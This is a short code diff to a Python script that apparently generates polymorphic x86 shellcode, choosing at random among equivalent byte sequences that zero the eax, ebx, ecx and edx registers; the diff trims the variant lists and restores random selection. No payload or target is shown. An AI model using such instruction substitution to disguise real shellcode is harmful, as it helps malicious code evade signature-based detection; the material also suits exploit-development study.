@@ -10,34 +10,30 @@ def main():
     print(shellcode)
 
 def random_eax_clear():
-    eax_clear_array = ["\\x31\\xc0", "\\xC1\\xE8\\x1F", "\\x29\\xC0", "\\xB8\\xFF\\xFF\\xFF\\xFF\\x83\\xC0\\x01"]
-    #random_element = random.randrange(0, len(eax_clear_array))
-    random_element = 3
+    eax_clear_array = ["\\x31\\xc0", "\\x29\\xC0"]
+    random_element = random.randrange(0, len(eax_clear_array))
     print("eax random:%d" % random_element)
     
     return eax_clear_array[random_element]
 
 
 def random_ebx_clear():
-    ebx_clear_array = ["\\x31\\xDB", "\\xC1\\xEB\\x1F", "\\x29\\xDB", "\\xBB\\xFF\\xFF\\xFF\\xFF\\x83\\xC3\\x01"]
-    #random_element = random.randrange(0, len(ebx_clear_array))
-    random_element = 3
+    ebx_clear_array = ["\\x31\\xDB", "\\x29\\xDB"]
+    random_element = random.randrange(0, len(ebx_clear_array))
     print("ebx random:%d" % random_element)
 
     return ebx_clear_array[random_element]
 
 def random_ecx_clear():
-    ecx_clear_array = ["\\x31\\xC9", "\\xC1\\xE9\\x1F", "\\x29\\xC9", "\\xB9\\xFF\\xFF\\xFF\\xFF\\x83\\xC1\\x01"]
-    #random_element = random.randrange(0, len(ecx_clear_array))
-    random_element = 3
+    ecx_clear_array = ["\\x31\\xC9", "\\x29\\xC9"]
+    random_element = random.randrange(0, len(ecx_clear_array))
     print("ecx random:%d" % random_element)
 
     return ecx_clear_array[random_element]
 
 def random_edx_clear():
-    edx_clear_array = ["\\x31\\xD2", "\\xC1\\xEA\\x1F", "\\x29\\xD2", "\\xBA\\xFF\\xFF\\xFF\\xFF\\x83\\xC2\\x01"]
-    #random_element = random.randrange(0, len(edx_clear_array))
-    random_element = 3
+    edx_clear_array = ["\\x31\\xD2", "\\x29\\xD2"]
+    random_element = random.randrange(0, len(edx_clear_array))
     print("edx random:%d" % random_element)
 
     return edx_clear_array[random_element]
